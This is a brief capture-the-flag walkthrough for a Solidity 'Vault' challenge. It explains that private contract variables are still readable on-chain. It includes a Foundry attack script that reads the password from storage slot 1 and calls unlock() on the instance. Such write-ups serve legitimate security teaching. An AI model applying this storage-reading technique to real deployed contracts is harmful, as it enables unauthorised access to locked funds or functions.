# Vault   
Our mission in this challenge is to unlock the vault. To do this, we need to change the `locked` variable from `true` to `false`.
However, to achieve this, we must first determine the value of the `password`. At first glance, this seems challenging because the `password` is a private variable, and we cannot directly read its value... or can we? 🤔

While private variables in Solidity prevent other contracts from accessing their values, they do not stop real people like you and me from reading them. This means we can retrieve the `password` and use it to unlock the vault.

To accomplish this, we can use tools like `cast`, but I prefer writing a script for more control. Here's how I did it:   
```solidity
//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script, console2} from "forge-std/Script.sol";

contract AttackScript is Script {

	address victim = /* Your instance address */ ;	

	function run() public {
	bytes32 password = vm.load(victim, bytes32(uint256(1))); //1 because this is the slot of the password variable
	vm.startBroadcast();
	victim.call(abi.encodeWithSignature("unlock(bytes32)", password));
	vm.stopBroadcast();
	(, bytes memory data) = victim.staticcall(abi.encodeWithSignature("locked()"));
	console2.log(abi.decode(data, (uint256)));
}
}
```
